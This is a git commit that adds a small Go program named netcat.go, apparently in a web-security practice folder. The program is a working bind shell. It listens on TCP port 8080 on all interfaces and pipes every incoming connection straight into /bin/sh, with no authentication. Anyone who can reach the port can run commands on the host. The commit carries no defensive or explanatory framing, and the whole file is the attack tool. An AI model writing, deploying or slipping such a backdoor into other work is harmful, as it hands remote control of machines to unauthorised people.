fdd4d3e3ff4e93c4d563adce7d76f09152f48bd4
satorish <satorizoom51@gmail.com>
2025-11-25 23:01:20 +0100

    add netcat.go

---
+++ WEB/netcat/go.mod
@@ -0,0 +1,3 @@
+module netcat.go
+
+go 1.25.4
---
+++ WEB/netcat/netcat.go
@@ -0,0 +1,41 @@
+package main
+
+import (
+	"fmt"
+	"net"
+	"os/exec"
+)
+
+func main() {
+
+	listener, err := net.Listen("tcp", ":8080")
+	if err != nil {
+		fmt.Println("Error:", err)
+	}
+	defer listener.Close()
+
+	fmt.Println("Listening on 0.0.0.0:8080")
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			fmt.Println("Error:", err)
+			continue
+		}
+
+		go handle(conn)
+	}
+}
+
+func handle(conn net.Conn) {
+	defer conn.Close()
+
+	cmd := exec.Command("/bin/sh")
+
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	if err := cmd.Run(); err != nil {
+		fmt.Println("Can not open cmd, error:", err)
+	}
+}
